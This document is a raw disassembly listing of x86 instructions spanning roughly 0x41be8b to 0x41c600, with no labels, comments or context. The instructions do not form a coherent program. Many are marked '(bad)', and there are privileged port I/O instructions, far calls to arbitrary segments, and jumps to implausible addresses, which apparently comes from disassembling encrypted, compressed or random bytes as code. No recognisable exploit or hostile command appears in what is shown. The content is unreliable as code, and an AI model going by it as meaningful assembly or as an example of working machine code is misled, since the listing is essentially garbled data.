  41be8b:	call   0x2a99:0x4ebbe94b
  41be92:	or     eax,0x27ea8cbd
  41be97:	ret    0x3c24
  41be9a:	leave  
  41be9b:	out    dx,al
  41be9c:	shl    BYTE PTR [edx],1
  41be9e:	add    DWORD PTR [esi-0x5a5c7e94],ecx
  41bea4:	fstp   TBYTE PTR [ebp-0x11]
  41bea7:	es pop ss
  41bea9:	rol    DWORD PTR [esi+0x48],cl
  41beac:	sahf   
  41bead:	repz lea ebx,[ebp+0x17]
  41beb1:	stos   DWORD PTR es:[edi],eax
  41beb2:	(bad)  
  41beb3:	mov    ds:0xe17ab4fe,al
  41beb8:	xor    edi,edx
  41beba:	inc    edi
  41bebb:	push   ss
  41bebc:	daa    
  41bebd:	pop    edx
  41bebe:	loope  0x41bed5
  41bec0:	cmp    bl,ch
  41bec2:	push   edx
  41bec3:	dec    ch
  41bec5:	push   cs
  41bec6:	ret    0xe373
  41bec9:	xor    DWORD PTR [edi+0x3387fd1c],edi
  41becf:	sbb    cl,BYTE PTR [ebx]
  41bed1:	sbb    bh,bl
  41bed3:	fcomip st,st(1)
  41bed5:	idiv   ebp
  41bed7:	js     0x41be8b
  41bed9:	(bad)  
  41beda:	add    al,0xf2
  41bedc:	aad    0x25
  41bede:	cmc    
  41bedf:	call   0x4a75:0xfb5371ab
  41bee6:	inc    ebp
  41bee7:	adc    eax,0xfd747636
  41beec:	inc    esp
  41beed:	adc    cl,BYTE PTR [ebx+0x13f10680]
  41bef3:	rcl    BYTE PTR [ebp+0x1d],0xf
  41bef7:	sbb    DWORD PTR [ebx-0x34],ebx
  41befa:	add    ecx,DWORD PTR [ebp-0x31acdbdd]
  41bf00:	push   0x4ebf71b5
  41bf05:	push   0x43d6d3f8
  41bf0a:	add    al,0x40
  41bf0c:	cli    
  41bf0d:	sbb    DWORD PTR [eax+0x79],0x9de9a17b
  41bf14:	adc    eax,0xc690c70e
  41bf19:	mov    al,0xa2
  41bf1b:	jns    0x41beca
  41bf1d:	xor    BYTE PTR [edi-0x6f],0x60
  41bf21:	cmp    al,0x54
  41bf23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf24:	cmp    dh,BYTE PTR [eax-0x28]
  41bf27:	stc    
  41bf28:	int    0xbd
  41bf2a:	call   0xe87ac85c
  41bf2f:	xchg   DWORD PTR [ecx+0x715cb0e5],esi
  41bf35:	and    BYTE PTR ds:0xad6ac2d0,0x4c
  41bf3c:	push   0x3e9409fc
  41bf41:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf43:	std    
  41bf44:	cmp    al,0xd7
  41bf46:	lock mov es,WORD PTR [ebx]
  41bf49:	stc    
  41bf4a:	push   ebp
  41bf4b:	inc    ebx
  41bf4c:	adc    eax,0xcb7dafbe
  41bf51:	push   0x55
  41bf53:	push   ss
  41bf54:	mov    ah,0xc
  41bf56:	gs ins BYTE PTR es:[edi],dx
  41bf58:	fst    DWORD PTR [ebx+0x1c]
  41bf5b:	mov    bl,0xb5
  41bf5d:	(bad)  
  41bf5e:	call   0xd7b8eb5a
  41bf63:	test   BYTE PTR [ebx+ebx*1],0x62
  41bf67:	jle    0x41beec
  41bf69:	pop    eax
  41bf6a:	dec    esi
  41bf6b:	pop    ecx
  41bf6c:	call   0x1fb308c
  41bf71:	xor    eax,0x3f1f7085
  41bf76:	in     eax,0xf4
  41bf78:	cwde   
  41bf79:	xor    esi,eax
  41bf7b:	daa    
  41bf7c:	scas   eax,DWORD PTR es:[edi]
  41bf7d:	add    eax,0x23
  41bf80:	daa    
  41bf81:	sbb    BYTE PTR [edx+0x66f46ae2],dh
  41bf87:	push   ebp
  41bf88:	retf   
  41bf89:	sti    
  41bf8a:	inc    esp
  41bf8b:	push   es
  41bf8c:	dec    edi
  41bf8d:	cmp    eax,0x6277d333
  41bf92:	lock imul eax,DWORD PTR [esi+0x2b],0xffffff93
  41bf97:	jg     0x41bfe3
  41bf99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf9a:	fadd   QWORD PTR [ecx+edx*8+0x2a]
  41bf9e:	mov    eax,ds:0x35363b42
  41bfa3:	inc    esp
  41bfa4:	or     DWORD PTR [esi-0x45],edx
  41bfa7:	loopne 0x41bf80
  41bfa9:	daa    
  41bfaa:	inc    ebp
  41bfab:	repz dec eax
  41bfad:	dec    edx
  41bfae:	aaa    
  41bfaf:	and    BYTE PTR [ecx+0x4bedddbf],ah
  41bfb5:	mov    edi,0x45027b02
  41bfba:	mov    BYTE PTR [ecx-0x57],bl
  41bfbd:	sub    esp,edx
  41bfbf:	and    DWORD PTR [edx+0x57],esi
  41bfc2:	push   eax
  41bfc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfc4:	daa    
  41bfc5:	jmp    0xc63808c4
  41bfca:	cli    
  41bfcb:	or     dh,BYTE PTR [edx-0x651c4ca0]
  41bfd1:	call   0x9c17:0x2be22288
  41bfd8:	loope  0x41c013
  41bfda:	in     al,0x47
  41bfdc:	xlat   BYTE PTR ds:[ebx]
  41bfdd:	sbb    dl,BYTE PTR [esi]
  41bfdf:	or     eax,0x9a49783b
  41bfe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfe5:	pop    ss
  41bfe6:	ins    BYTE PTR es:[edi],dx
  41bfe7:	push   ebp
  41bfe8:	sar    DWORD PTR [ebp-0x60501a01],1
  41bfee:	pop    ebp
  41bfef:	rol    DWORD PTR [ebp+0x5b],cl
  41bff2:	or     al,0x44
  41bff4:	rcr    DWORD PTR [eax-0x4f],1
  41bff7:	popf   
  41bff8:	push   es
  41bff9:	push   ecx
  41bffa:	push   eax
  41bffb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bffc:	pop    esp
  41bffd:	outs   dx,BYTE PTR ds:[esi]
  41bffe:	clc    
  41bfff:	jge    0x41bfaf
  41c001:	add    ebx,DWORD PTR [esi+0x20]
  41c004:	lock dec edx
  41c006:	push   edi
  41c007:	les    ebp,FWORD PTR [edi+eax*8]
  41c00a:	iret   
  41c00b:	test   DWORD PTR ds:0x341f9bff,0xa0482ad1
  41c015:	mov    ebx,0x53ea5416
  41c01a:	mov    esi,0x72252266
  41c01f:	and    DWORD PTR [ecx-0x38c42a82],ecx
  41c025:	in     al,dx
  41c026:	sar    DWORD PTR [edx+0x78d92b08],1
  41c02c:	or     al,0x7c
  41c02e:	push   edi
  41c02f:	jp     0x41c072
  41c031:	mov    eax,ds:0xa11b17d5
  41c036:	into   
  41c037:	(bad)  
  41c038:	jnp    0x41c03d
  41c03a:	xor    BYTE PTR [edi-0x160fef52],ch
  41c040:	xor    DWORD PTR [eax+0x75],eax
  41c043:	pop    esi
  41c044:	(bad)  
  41c045:	and    ch,BYTE PTR [ecx+0x35]
  41c048:	and    eax,0xa137ebf4
  41c04d:	sub    ebx,DWORD PTR [esi]
  41c04f:	mov    bh,0xe
  41c051:	mov    al,ds:0x24056a04
  41c056:	rcr    dh,0xaf
  41c059:	push   esi
  41c05a:	addr16 xchg edi,eax
  41c05c:	jg     0x41c082
  41c05e:	icebp  
  41c05f:	pop    esi
  41c060:	inc    esi
  41c061:	lea    ebx,[ebx]
  41c063:	aam    0xff
  41c065:	leave  
  41c066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c067:	dec    esi
  41c068:	cmp    al,0xfe
  41c06a:	add    al,0xa4
  41c06c:	lock test eax,0xb3bb8ddd
  41c072:	cmp    BYTE PTR [eax],0x58
  41c075:	and    ebx,esi
  41c077:	push   esi
  41c078:	mov    BYTE PTR [edi+ebp*8],dl
  41c07b:	les    esi,FWORD PTR [esi-0x2e]
  41c07e:	test   eax,0xfe17514e
  41c083:	sar    BYTE PTR [eax+0x4b5d8e1],0x53
  41c08a:	xor    eax,0xd9afa0a3
  41c08f:	lods   eax,DWORD PTR ds:[esi]
  41c090:	sub    cl,BYTE PTR [edi+0x11ae7e83]
  41c096:	ins    BYTE PTR es:[edi],dx
  41c097:	stc    
  41c098:	and    BYTE PTR [esi+esi*4-0x40],0xfd
  41c09d:	cld    
  41c09e:	rcl    DWORD PTR [eax],cl
  41c0a0:	dec    esp
  41c0a1:	retf   0x531
  41c0a4:	mov    eax,ds:0xca138faf
  41c0a9:	add    bl,BYTE PTR [ecx-0x7b]
  41c0ac:	sbb    BYTE PTR ss:[ecx+ebp*1+0x14d5f3af],0x4b
  41c0b5:	hlt    
  41c0b6:	jl     0x41c0cc
  41c0b8:	stos   DWORD PTR es:[edi],eax
  41c0b9:	into   
  41c0ba:	icebp  
  41c0bb:	jge    0x41c12b
  41c0bd:	mov    dl,0x59
  41c0bf:	loop   0x41c12e
  41c0c1:	out    dx,al
  41c0c2:	mov    ebx,DWORD PTR es:0x807bf3fc
  41c0c9:	inc    ecx
  41c0ca:	stos   BYTE PTR es:[edi],al
  41c0cb:	mov    ecx,gs
  41c0cd:	ss jle 0x41c146
  41c0d0:	retf   
  41c0d1:	stc    
  41c0d2:	dec    BYTE PTR [ecx]
  41c0d4:	add    DWORD PTR [ecx+ebx*8],edx
  41c0d7:	shl    bh,cl
  41c0d9:	jbe    0x41c0a9
  41c0db:	sub    BYTE PTR [ecx+0x4e8c9197],0x58
  41c0e2:	or     al,0x36
  41c0e4:	jge    0x41c07f
  41c0e6:	mov    ebp,0xdc3f1f7a
  41c0eb:	jg     0x41c073
  41c0ed:	push   es
  41c0ee:	rcl    DWORD PTR [ebx],1
  41c0f0:	pusha  
  41c0f1:	aas    
  41c0f2:	push   esi
  41c0f3:	and    eax,0xa56b63a8
  41c0f8:	mov    dl,0xf2
  41c0fa:	fld    TBYTE PTR [esp+ebp*4+0xf]
  41c0fe:	sbb    ch,ah
  41c100:	inc    ecx
  41c101:	dec    ebx
  41c102:	xor    eax,0xaab90f73
  41c107:	dec    ebp
  41c108:	mov    al,BYTE PTR [ebx+0x34]
  41c10b:	dec    esi
  41c10c:	dec    ebp
  41c10d:	aad    0x19
  41c10f:	xchg   DWORD PTR [ebx+eax*4-0x63347a6],edx
  41c116:	push   0x521e9b33
  41c11b:	pusha  
  41c11c:	or     bl,0xb5
  41c11f:	inc    ebx
  41c120:	adc    BYTE PTR [eax+0x25894ed5],ah
  41c126:	fistp  QWORD PTR [eax-0x5e]
  41c129:	pop    ecx
  41c12a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c12b:	popf   
  41c12c:	add    esi,DWORD PTR [edi-0x11]
  41c12f:	ret    0x208a
  41c132:	add    eax,0xbf6930ad
  41c137:	ins    BYTE PTR es:[edi],dx
  41c138:	inc    esp
  41c139:	mul    DWORD PTR [edx-0x52]
  41c13c:	cli    
  41c13d:	sub    bh,BYTE PTR ds:0x316bf732
  41c143:	mov    ch,0xc
  41c145:	pop    eax
  41c146:	add    BYTE PTR [ebx+eax*1+0x4e],dl
  41c14a:	mov    edi,ebp
  41c14c:	mov    esi,0x77fb6b69
  41c151:	fucomip st,st(7)
  41c153:	js     0x41c15b
  41c155:	cdq    
  41c156:	mov    BYTE PTR [eax],0x92
  41c159:	push   ebp
  41c15a:	mov    esi,0x62d82bc8
  41c15f:	ja     0x41c150
  41c161:	dec    esi
  41c162:	fsubr  DWORD PTR [ecx-0x3b]
  41c165:	scas   al,BYTE PTR es:[edi]
  41c166:	ret    
  41c167:	(bad)  
  41c16a:	rcl    DWORD PTR [ebp-0x15],1
  41c16d:	sub    ebx,DWORD PTR [ebp-0x20204d65]
  41c173:	fyl2x  
  41c175:	daa    
  41c176:	dec    ecx
  41c177:	les    edi,FWORD PTR [ecx-0x19117e2a]
  41c17d:	ficom  DWORD PTR [ecx+0x178ea067]
  41c183:	mov    eax,0x2d085eb0
  41c188:	lods   al,BYTE PTR ds:[esi]
  41c18a:	and    BYTE PTR [eax],0x11
  41c18d:	jmp    0x41c178
  41c18f:	inc    eax
  41c190:	(bad)  
  41c191:	mul    BYTE PTR [eax]
  41c193:	cmc    
  41c194:	or     eax,0x623d51b7
  41c199:	stc    
  41c19a:	pop    ebx
  41c19b:	mov    ah,0xa9
  41c19d:	pop    edi
  41c19f:	push   ebx
  41c1a0:	adc    edx,DWORD PTR gs:[eax]
  41c1a3:	or     esi,DWORD PTR [edx-0x10]
  41c1a6:	xor    bl,ch
  41c1a8:	es dec ecx
  41c1aa:	and    BYTE PTR [eax+0x6f],al
  41c1ad:	popf   
  41c1ae:	scas   al,BYTE PTR es:[edi]
  41c1af:	dec    esp
  41c1b0:	cld    
  41c1b1:	add    al,0x50
  41c1b3:	add    DWORD PTR [esi+0x7bb8697f],0x8b910143
  41c1bd:	mov    edx,0xb7e8b6c2
  41c1c2:	mov    edi,0x1c037b01
  41c1c7:	int    0xf5
  41c1c9:	dec    ecx
  41c1ca:	sbb    esp,esi
  41c1cc:	mov    cl,cl
  41c1ce:	cmp    eax,0xb0e6f3dc
  41c1d3:	ja     0x41c224
  41c1d5:	pop    edx
  41c1d6:	sub    BYTE PTR [ecx+0x2e3002a1],bl
  41c1dc:	push   eax
  41c1dd:	mov    bh,0xcb
  41c1df:	jo     0x41c181
  41c1e1:	pop    esp
  41c1e2:	iret   
  41c1e3:	je     0x41c1b7
  41c1e5:	fcmovnbe st,st(0)
  41c1e7:	inc    eax
  41c1e8:	adc    esp,DWORD PTR [ebx+0x26]
  41c1eb:	jmp    0x41c1d0
  41c1ed:	xor    al,0x4f
  41c1ef:	cwde   
  41c1f0:	xchg   edi,eax
  41c1f1:	dec    esp
  41c1f2:	add    dl,dh
  41c1f4:	dec    ebp
  41c1f5:	(bad)  [edx]
  41c1f7:	out    dx,al
  41c1f8:	aas    
  41c1f9:	(bad)  
  41c1fa:	fisub  DWORD PTR [ebp-0x2d]
  41c1fd:	push   0x27c57cb6
  41c202:	jbe    0x287593d6
  41c208:	xchg   ebp,eax
  41c209:	lods   eax,DWORD PTR ds:[esi]
  41c20a:	sahf   
  41c20b:	cmp    al,0x84
  41c20d:	cs jno 0x41c1d9
  41c210:	adc    BYTE PTR [ebx],bh
  41c212:	fiadd  DWORD PTR [edx]
  41c214:	inc    eax
  41c215:	repz mov ds:0x26709958,al
  41c21b:	or     DWORD PTR [edx],esi
  41c21d:	dec    ebp
  41c21e:	cmc    
  41c21f:	cs shl bl,0x9a
  41c223:	test   BYTE PTR [edi-0x597017f7],bl
  41c229:	push   esp
  41c22a:	jo     0x41c200
  41c22c:	frstor [edi+0x50383b4b]
  41c232:	int3   
  41c233:	les    ebx,FWORD PTR [ebx-0x4457bbf7]
  41c239:	cs mov ecx,eax
  41c23c:	retf   0x123c
  41c23f:	aaa    
  41c240:	push   ebx
  41c241:	out    dx,eax
  41c242:	pop    ecx
  41c243:	loopne 0x41c2c4
  41c245:	inc    eax
  41c246:	test   BYTE PTR [eax],0x1e
  41c249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c24a:	sbb    eax,DWORD PTR [esi+edi*2]
  41c24d:	sbb    esi,DWORD PTR [edi*2+0x61bacc59]
  41c254:	cmp    BYTE PTR [edx-0x6f393a5c],al
  41c25a:	xchg   edx,eax
  41c25b:	aad    0x55
  41c25d:	sbb    eax,0xd27447df
  41c262:	cdq    
  41c263:	cmp    eax,0x93d714a3
  41c268:	lds    esp,FWORD PTR [edi-0x38]
  41c26b:	sar    DWORD PTR [esi],1
  41c26d:	mov    ah,0xdd
  41c26f:	jno    0x41c213
  41c271:	rcl    BYTE PTR [eax],1
  41c273:	int    0xab
  41c275:	jns    0x41c228
  41c277:	and    dh,0xa7
  41c27a:	js     0x41c2b7
  41c27c:	mov    WORD PTR [ebp+0x3fb872cd],?
  41c282:	xchg   ebx,eax
  41c283:	pusha  
  41c284:	push   edi
  41c285:	and    eax,0x332c765a
  41c28a:	add    BYTE PTR [ebx+0x58],bl
  41c28d:	test   BYTE PTR [eax+edx*8+0x28],dl
  41c291:	inc    esp
  41c292:	dec    ebx
  41c293:	mov    DWORD PTR [ecx+eax*8-0x7c],esp
  41c297:	ss stos DWORD PTR es:[edi],eax
  41c299:	out    0x7a,eax
  41c29b:	dec    eax
  41c29c:	dec    ebp
  41c29d:	pusha  
  41c29e:	adc    al,0x2e
  41c2a0:	pushf  
  41c2a1:	adc    eax,0xd28c676f
  41c2a6:	das    
  41c2a7:	adc    dl,BYTE PTR [ebx-0x54]
  41c2aa:	jl     0x41c2e3
  41c2ac:	push   DWORD PTR [ebp+0x71]
  41c2af:	or     edx,0xffffffba
  41c2b2:	sub    cl,BYTE PTR [eax-0x6c]
  41c2b5:	sub    DWORD PTR [edx-0x256e663b],ecx
  41c2bb:	xchg   edi,eax
  41c2bc:	daa    
  41c2bd:	mov    eax,0x4da2cbc1
  41c2c2:	lea    eax,[ebx+0x5fd19534]
  41c2c8:	lds    ebx,FWORD PTR [ecx+0x7c]
  41c2cb:	mov    ch,0x61
  41c2cd:	push   esp
  41c2ce:	loope  0x41c271
  41c2d0:	cmp    ebx,0xe9d0b9de
  41c2d6:	sbb    eax,0xfa817b4c
  41c2db:	cmc    
  41c2dc:	daa    
  41c2dd:	retf   0xf6d2
  41c2e0:	or     ebp,ebx
  41c2e2:	adc    BYTE PTR [edi],ch
  41c2e4:	cdq    
  41c2e5:	retf   0xb189
  41c2e8:	push   edx
  41c2ea:	(bad)  
  41c2eb:	loopne 0x41c294
  41c2ed:	js     0x41c363
  41c2ef:	ja     0x41c328
  41c2f1:	ror    edi,cl
  41c2f3:	mov    ah,0xc2
  41c2f5:	ds add al,0x2a
  41c2f8:	out    dx,al
  41c2f9:	lods   al,BYTE PTR ds:[esi]
  41c2fa:	popa   
  41c2fb:	call   0x5ed1:0x257c43e0
  41c302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c303:	jno    0x41c2ce
  41c305:	pusha  
  41c306:	sbb    DWORD PTR [ebx+edx*1-0x4493a88e],esp
  41c30d:	fsubr  st,st(0)
  41c30f:	lahf   
  41c310:	sub    dl,BYTE PTR [esi+0x2c93f27]
  41c316:	cmp    al,0x64
  41c318:	add    edx,DWORD PTR [ecx]
  41c31a:	jmp    0x41c2bf
  41c31c:	call   0xfc848a74
  41c321:	mov    dl,BYTE PTR [ebx]
  41c323:	sub    al,0xfe
  41c325:	pop    ebp
  41c326:	test   DWORD PTR [esi+edx*8+0x288f18c0],edx
  41c32d:	cwde   
  41c32e:	addr16 push ecx
  41c330:	mov    bl,0x46
  41c332:	add    DWORD PTR [eax+0xd],edx
  41c335:	or     bl,BYTE PTR [eax-0xb]
  41c338:	aas    
  41c339:	neg    al
  41c33b:	pop    eax
  41c33c:	emms   
  41c33e:	jg     0x41c37c
  41c340:	pop    edx
  41c341:	jns    0x41c336
  41c343:	test   DWORD PTR [eax+0x60f14996],ebp
  41c349:	mov    dh,0xb1
  41c34b:	arpl   WORD PTR [esi],cx
  41c34d:	cmp    DWORD PTR [ebp-0x7c8e7336],edi
  41c353:	out    dx,eax
  41c354:	sbb    BYTE PTR [edi],ch
  41c356:	pop    ebp
  41c357:	out    dx,al
  41c358:	leave  
  41c359:	in     al,0x36
  41c35b:	xchg   BYTE PTR [ebp+0x71],dh
  41c35e:	pop    ebx
  41c35f:	mov    ds:0x6d7b7059,eax
  41c364:	or     cl,BYTE PTR [edx+esi*8+0x794872d2]
  41c36b:	push   esp
  41c36c:	fiadd  WORD PTR [ecx]
  41c36e:	enter  0x4e0,0x7f
  41c372:	xor    BYTE PTR [edx+0x53],0xbd
  41c376:	data16 cmps BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41c379:	and    eax,esp
  41c37b:	retf   
  41c37c:	add    DWORD PTR [edx-0x4a19a8bb],0xffffff9a
  41c383:	cmp    DWORD PTR [ebx-0x151b2dfb],esp
  41c389:	jge    0x41c329
  41c38b:	aam    0xa5
  41c38d:	scas   eax,DWORD PTR es:[edi]
  41c38e:	dec    esp
  41c38f:	dec    ecx
  41c390:	xor    ebp,DWORD PTR [edx]
  41c392:	jno    0x41c3a4
  41c394:	lds    eax,FWORD PTR [ecx]
  41c396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c397:	scas   al,BYTE PTR es:[edi]
  41c398:	loopne 0x41c408
  41c39a:	add    ch,BYTE PTR [ebp+edi*8+0x45]
  41c39e:	jge    0x41c3ee
  41c3a0:	jecxz  0x41c415
  41c3a2:	xor    al,0xaf
  41c3a4:	jae    0x41c40c
  41c3a6:	inc    ebx
  41c3a7:	mov    eax,0x487c40ec
  41c3ac:	aad    0x69
  41c3ae:	into   
  41c3af:	inc    BYTE PTR [ebp-0x72fdd785]
  41c3b5:	sub    eax,0xd2fa000a
  41c3ba:	jne    0x41c3a5
  41c3bc:	sub    eax,0x52f1ea74
  41c3c1:	mov    DWORD PTR [edx-0x4a1cb3ad],esp
  41c3c7:	stos   BYTE PTR es:[edi],al
  41c3c8:	in     al,0x9
  41c3ca:	ret    0xc5ce
  41c3cd:	lods   al,BYTE PTR ds:[esi]
  41c3ce:	mov    ?,esi
  41c3d0:	jno    0x41c401
  41c3d2:	jle    0x41c427
  41c3d4:	icebp  
  41c3d5:	xor    al,BYTE PTR [bp+si]
  41c3d8:	out    0x53,eax
  41c3da:	ss adc eax,0x2f1ccfa8
  41c3e0:	je     0x41c388
  41c3e2:	jmp    0xddbd56d9
  41c3e7:	and    DWORD PTR [edx+0x110404a7],esi
  41c3ed:	lea    ecx,[esi]
  41c3ef:	pop    esi
  41c3f0:	adc    BYTE PTR [esi-0x28],0x89
  41c3f4:	mov    edx,0x6fd1a8c4
  41c3f9:	push   esi
  41c3fa:	cmp    eax,0xc2567712
  41c3ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c400:	fisubr WORD PTR [esi+eiz*8+0x6a]
  41c404:	in     eax,0x5d
  41c406:	stos   BYTE PTR es:[edi],al
  41c407:	mov    bh,0xc3
  41c409:	ret    0xc8ae
  41c40c:	jle    0x41c40b
  41c40e:	sub    edi,DWORD PTR [edi+0x7b0377a8]
  41c414:	jecxz  0x41c3a4
  41c416:	inc    edx
  41c417:	jmp    FWORD PTR [ecx+edx*1-0x5a]
  41c41b:	cmp    bh,BYTE PTR [ecx-0x76e968f]
  41c421:	add    DWORD PTR [edx],0x3b
  41c424:	aam    0xc5
  41c426:	les    ecx,FWORD PTR [edx]
  41c428:	frstor [ebx+0x7e]
  41c42b:	ret    0x5116
  41c42e:	mov    al,0x84
  41c430:	and    al,0x46
  41c432:	ins    DWORD PTR es:[edi],dx
  41c433:	push   cs
  41c434:	mov    dh,0xe3
  41c436:	sub    al,0xd5
  41c438:	popa   
  41c439:	inc    edi
  41c43a:	add    ecx,ebx
  41c43c:	xchg   ebx,eax
  41c43d:	adc    DWORD PTR [edi-0x6b],edi
  41c440:	test   eax,0x8e648415
  41c445:	pop    es
  41c446:	gs mov dh,0x8d
  41c449:	cs jbe 0x41c468
  41c44c:	jl     0x41c47f
  41c44e:	lock mov DWORD PTR [ebx+0x7b694e8d],edx
  41c455:	push   ss
  41c456:	inc    ebp
  41c457:	xor    ch,dh
  41c459:	aam    0x93
  41c45b:	push   ecx
  41c45c:	js     0x41c444
  41c45e:	mov    esp,0xc2133230
  41c463:	mov    al,BYTE PTR [ebx+0x4d]
  41c466:	cmp    ebp,DWORD PTR [ecx]
  41c468:	cmp    al,0x7e
  41c46a:	lahf   
  41c46b:	repnz das 
  41c46d:	fiadd  DWORD PTR [edi]
  41c46f:	cdq    
  41c470:	pop    ebx
  41c471:	idiv   DWORD PTR [eax+ebx*8-0x33]
  41c475:	std    
  41c476:	iret   
  41c477:	stos   BYTE PTR es:[edi],al
  41c478:	mov    dl,0x84
  41c47a:	mov    eax,0x2ca2fce0
  41c47f:	xlat   BYTE PTR ds:[ebx]
  41c480:	and    al,0x4
  41c482:	xchg   esi,eax
  41c483:	xor    al,0xf7
  41c485:	ror    BYTE PTR [ebx-0x53],cl
  41c488:	dec    ebx
  41c489:	mov    ecx,0xa757d049
  41c48e:	leave  
  41c48f:	and    al,BYTE PTR [ebx-0x65de3f9c]
  41c495:	mov    ebx,0x902cdce3
  41c49a:	mov    ?,WORD PTR [eax+0x42b6f502]
  41c4a0:	cmp    dh,BYTE PTR [ecx]
  41c4a2:	sti    
  41c4a3:	stos   BYTE PTR es:[edi],al
  41c4a4:	jp     0x41c433
  41c4a6:	test   DWORD PTR [esi-0x7],ecx
  41c4a9:	inc    ecx
  41c4aa:	mov    BYTE PTR [esi-0x39],dl
  41c4ad:	push   0x21
  41c4af:	mov    ah,0xc
  41c4b1:	or     DWORD PTR [edx-0x725a2da],esi
  41c4b7:	psubsw mm1,QWORD PTR [esp+edi*4]
  41c4bb:	lods   al,BYTE PTR ds:[esi]
  41c4bc:	fwait
  41c4bd:	mov    esi,0xd6c56cd7
  41c4c2:	fneni(8087 only) 
  41c4c4:	push   edx
  41c4c5:	mov    ecx,0xa7f8017a
  41c4ca:	je     0x41c4df
  41c4cc:	outs   dx,BYTE PTR ds:[esi]
  41c4cd:	and    al,0x1a
  41c4cf:	mov    dh,0x19
  41c4d1:	add    al,0x9d
  41c4d3:	xor    DWORD PTR [esp+eiz*2+0x63fb815b],edx
  41c4da:	ins    BYTE PTR es:[edi],dx
  41c4db:	dec    edi
  41c4dc:	(bad)  
  41c4dd:	repnz pop ebx
  41c4df:	repnz test eax,0x96d300fc
  41c4e5:	jp     0x41c4e3
  41c4e7:	lods   al,BYTE PTR ds:[esi]
  41c4e8:	or     DWORD PTR [ebx+ebx*4+0x32240de7],0x5fa434c8
  41c4f3:	xor    DWORD PTR ds:0xb3702be4,edx
  41c4f9:	sub    BYTE PTR [edi-0x2498b758],0x8
  41c500:	popf   
  41c501:	ror    DWORD PTR [edx],0x94
  41c504:	test   ebx,ebp
  41c506:	inc    edx
  41c507:	ins    BYTE PTR es:[edi],dx
  41c508:	xchg   BYTE PTR [edx+ebx*4-0x3eb9d723],bl
  41c50f:	out    dx,eax
  41c510:	mov    es,esp
  41c512:	es jecxz 0x41c54e
  41c515:	push   es
  41c516:	mov    bl,0x86
  41c518:	pop    esp
  41c519:	sbb    esp,DWORD PTR [ecx-0x61]
  41c51c:	sti    
  41c51d:	cmc    
  41c51e:	mov    ch,BYTE PTR [ecx+0x71]
  41c521:	mov    eax,ds:0x5443cd9b
  41c526:	pop    eax
  41c527:	or     eax,0xa5e561a5
  41c52c:	(bad)  
  41c52e:	xlat   BYTE PTR fs:[ebx]
  41c530:	mov    gs,WORD PTR [eax+0x39524b3b]
  41c536:	or     al,0xcd
  41c538:	nop
  41c539:	aaa    
  41c53a:	data16 fstp DWORD PTR [ebx+0x48]
  41c53e:	out    0x85,al
  41c540:	sbb    BYTE PTR [edx+0x18d33685],dh
  41c546:	pop    ebx
  41c547:	jl     0x41c54e
  41c549:	ins    BYTE PTR es:[edi],dx
  41c54a:	sbb    BYTE PTR ds:0xf9a6db18,bh
  41c550:	sbb    ebp,DWORD PTR [eax]
  41c552:	loop   0x41c557
  41c554:	push   ebx
  41c555:	sbb    ecx,DWORD PTR [ecx+edi*1]
  41c558:	in     eax,0xcb
  41c55a:	jmp    0x402d276e
  41c55f:	mov    bh,0xe5
  41c561:	or     edi,DWORD PTR ds:0xcb89ea10
  41c567:	xor    BYTE PTR [esi-0x7ba22cd],cl
  41c56d:	jl     0x41c5bc
  41c56f:	mov    bh,0xb5
  41c571:	sbb    al,0xbd
  41c573:	lock scas eax,DWORD PTR es:[edi]
  41c575:	iret   
  41c576:	xchg   edi,eax
  41c577:	shl    DWORD PTR [edx-0x6],0xdb
  41c57b:	mov    al,0x14
  41c57d:	cmp    eax,0x8475b3
  41c582:	push   0xd7bcd59f
  41c587:	(bad)  
  41c588:	repnz rcl DWORD PTR [esi-0x34],1
  41c58c:	pop    esi
  41c58d:	jmp    0xc4bf0c41
  41c592:	dec    ebx
  41c593:	cwde   
  41c594:	push   edi
  41c595:	mov    WORD PTR [eax-0xb],fs
  41c598:	inc    ebp
  41c599:	fwait
  41c59a:	sahf   
  41c59b:	call   0x76ce87b5
  41c5a0:	inc    ecx
  41c5a1:	loopne 0x41c595
  41c5a3:	or     eax,DWORD PTR fs:[ebx+0x5fa68b6d]
  41c5aa:	or     al,0xb1
  41c5ac:	adc    DWORD PTR [ecx+0x12e8c4fb],ecx
  41c5b2:	pop    ecx
  41c5b3:	(bad)  
  41c5b4:	fsubr  DWORD PTR [ecx+0x6d]
  41c5b7:	sub    BYTE PTR [ebx],dl
  41c5b9:	scas   eax,DWORD PTR es:[edi]
  41c5ba:	int3   
  41c5bb:	mov    dl,0xdd
  41c5bd:	fbld   TBYTE PTR [ebp-0x45]
  41c5c0:	dec    ebx
  41c5c1:	jae    0x41c54a
  41c5c3:	test   al,0xde
  41c5c5:	mov    ds:0x75210ac4,eax
  41c5ca:	outs   dx,DWORD PTR ds:[esi]
  41c5cb:	sub    ch,BYTE PTR [ebp+0x34c8644b]
  41c5d1:	xchg   esp,eax
  41c5d2:	clc    
  41c5d3:	test   DWORD PTR [ecx],edi
  41c5d5:	std    
  41c5d6:	jae    0x41c5d1
  41c5d8:	xor    al,0x52
  41c5da:	inc    ebp
  41c5db:	arpl   WORD PTR [edx-0x20705305],si
  41c5e1:	mov    bl,0x7f
  41c5e3:	fbstp  TBYTE PTR [esi-0x22817168]
  41c5e9:	jecxz  0x41c56c
  41c5eb:	fwait
  41c5ec:	outs   dx,DWORD PTR ds:[esi]
  41c5ed:	lods   al,BYTE PTR ds:[esi]
  41c5ee:	mov    al,ds:0xa270a92d
  41c5f3:	int    0x93
  41c5f5:	push   eax
  41c5f6:	mov    ds:0x997d00ac,al
  41c5fb:	pop    edi
  41c5fc:	inc    esi
  41c5fd:	adc    esp,edx
  41c5ff:	ins    DWORD PTR es:[edi],dx
  41c600:	dec    eax
